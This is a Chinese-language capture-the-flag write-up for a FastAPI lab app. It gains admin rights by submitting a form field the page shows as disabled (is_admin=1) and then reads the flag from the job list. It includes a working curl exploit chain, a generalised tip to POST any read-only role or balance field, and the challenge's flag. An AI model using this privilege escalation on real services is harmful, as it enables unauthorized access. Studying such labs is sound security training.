## 题解

### 入口与指纹

`uvicorn`（FastAPI）单端口服务。`GET /` 是登录页，页面上直接给了演示账号：

```text
To try the app you can use the demo account: Username: demo, Password: demo
```

登录表单 `POST /token`，成功时 `303 → /company/1/jobs`，并下发：

```http
Set-Cookie: access_token="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxNzkzMDY2MTE2fQ..."; HttpOnly; Path=/
```

JWT payload 是 `{"sub":"1","exp":...}`——**只有主体 ID，没有角色**。

### 关键观察

**1. `/openapi.json` 把接口全列出来了。**

```text
/token                        POST
/                             GET
/company/{company_id}/jobs    GET
/ping                         GET
/system_config/{company_id}   GET, POST
```

这是本库的通用第一步：FastAPI 默认暴露 OpenAPI，不用猜路径。

**2. 资料页把 `is_admin` 渲染成 disabled，但服务端照样接受。**

`GET /system_config/1`：

```html
<select class="form-control" id="is_admin" name="is_admin" disabled>
    <option value="0" selected>Regular</option>
    <option value="1">Admin</option>
</select>
```

`disabled` 只是**浏览器不提交这个字段**，服务端没有校验。

```bash
curl -b cj -X POST -d 'name=demo&is_admin=1' http://$T/system_config/1
```

提交后再取 `GET /system_config/1`，`is_admin` 变成 `1 selected`——**提权成功**。

**3. 提权后的收益在岗位列表页。**

`GET /company/1/jobs` 在提权前只有一条 `demo Job 1`，提权后返回内容里带上 flag。

### 利用链

```bash
T=$(head -1 .target)
cj=$(mktemp)

# 1. 用页面给的 demo 账号登录
curl -sS -c $cj -b $cj -X POST -d 'username=demo&password=demo' "http://$T/token"

# 2. 绕过前端 disabled，直接把 is_admin 置 1
curl -sS -b $cj -X POST -d 'name=demo&is_admin=1' "http://$T/system_config/1"

# 3. 读岗位列表，flag 在返回体里
curl -sS -b $cj "http://$T/company/1/jobs" | grep -o 'flag{[^}]*}'
```

本次平台接受的值是 `flag{2ec88db8-6e11-4640-8774-1d62cf69c522}`。

### flag 位置

`GET /company/1/jobs` 的 HTML 正文，`is_admin=1` 之后才出现。

## 复盘

- **`disabled` / `readonly` / `hidden` 都是客户端约束，不是权限。** 凡是表单里出现"不可编辑"的
  角色、状态、余额、上限字段，第一反应应该是直接 POST 它，而不是找别的路。
- **`/openapi.json` 优先于目录爆破。** 本题 5 个接口一次全拿到，省掉了猜 `/admin`、`/users` 的过程
  （实测猜 `admin`/`admin/users`/`users`/`users/2` 全是 404）。
- **IDOR 要分清"改自己"和"改别人"。** 本题改的是自己的 `company_id=1`；
  顺手试 `GET /system_config/2` 返回 `401 {"detail":"Could not validate credentials"}`，
  说明按 `company_id` 有归属校验，这条路才是死路——不要在这里继续投入。
- JWT 里没有 `role` 字段是个提示：**授权判断不在 token 里，而是每次请求回查数据库**，
  所以改库（或改自己能改的记录）才是正确方向。
